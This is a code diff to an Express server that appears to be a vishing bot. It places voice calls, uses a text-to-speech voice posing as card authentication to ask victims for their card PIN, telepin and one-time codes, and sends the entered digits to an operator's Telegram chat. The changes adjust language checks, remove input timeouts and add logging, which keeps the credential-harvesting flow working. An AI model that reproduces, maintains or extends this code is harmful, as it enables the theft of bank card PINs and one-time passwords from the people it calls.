@@ -207,7 +207,7 @@ app.get('/calls/pin/:chatId/:language', async (req, res) => {
   if (dtmf) {
     await bot.telegram.sendMessage(
       req.params.chatId,
-      req.params.language === 'en-US'
+      req.params.language === 'en-us'
         ? `Card Pin is <b>${dtmf}</b> 💳`
         : `Telepin is <b>${dtmf}</b> 📟`,
       {
@@ -274,7 +274,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -286,7 +285,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -331,7 +329,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -343,7 +340,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -375,7 +371,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
             payload: `GREAT. you have entered ${dtmf
               .split('')
               .join(' ')}. To AUTHENTICATE YOU please enter your ${
-              language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+              language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
             } followed by the pound key.`,
             language,
             voice: 'female',
@@ -383,7 +379,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -395,7 +390,6 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: 5,
           maxNumKeys: 8,
         },
         {
@@ -412,6 +406,8 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
 
 app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
   const { askCardInfo, cardType, variables } = req.query;
+  console.log('req.query: ', req.query);
+
   const { language, chatId, step } = req.params;
 
   const { dtmf } = JSON.parse(variables as string);
@@ -475,7 +471,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               payload: `GREAT. you have entered ${dtmf
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
-                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               } followed by the pound key.`,
               language,
               voice: 'female',
@@ -483,7 +479,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'bankStepPin',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: 5,
             maxNumKeys: 8,
           },
           {
@@ -495,7 +490,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'bankStepPin',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: 5,
             maxNumKeys: 8,
           },
           {
@@ -530,7 +524,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               payload: `GREAT. you have entered ${dtmf
                 .split('')
                 .join(' ')}. To AUTHENTICATE YOU please enter your ${
-                language === 'en-US' ? 'CARD PIN' : 'TELEPIN'
+                language === 'en-us' ? 'CARD PIN' : 'TELEPIN'
               } followed by the pound key.`,
               language,
               voice: 'female',
@@ -540,7 +534,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'cardStepGoto',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: 5,
             maxNumKeys: 8,
           },
           {
@@ -552,7 +545,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'cardStepGoto',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: 5,
             maxNumKeys: 8,
           },
           {
@@ -598,7 +590,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 18,
             },
             {
@@ -610,7 +601,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 18,
             },
             {
@@ -679,7 +669,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 6,
             },
             {
@@ -691,7 +680,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 6,
             },
             {
@@ -722,7 +710,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 18,
             },
             {
@@ -734,7 +721,6 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: 5,
               maxNumKeys: 18,
             },
             {
@@ -786,13 +772,9 @@ app.post('/calls/:chatId', async (req, res) => {
   }
 
   if (Status === 'MACHINE') {
-    await bot.telegram.sendMessage(
-      chatId,
-      '<b>Voicemail</b> ❌\n\nCall again',
-      {
-        parse_mode: 'HTML',
-      },
-    );
+    await bot.telegram.sendMessage(chatId, '<b>Voicemail</b> ❌', {
+      parse_mode: 'HTML',
+    });
   }
 
   if (status === 'cancelled') {
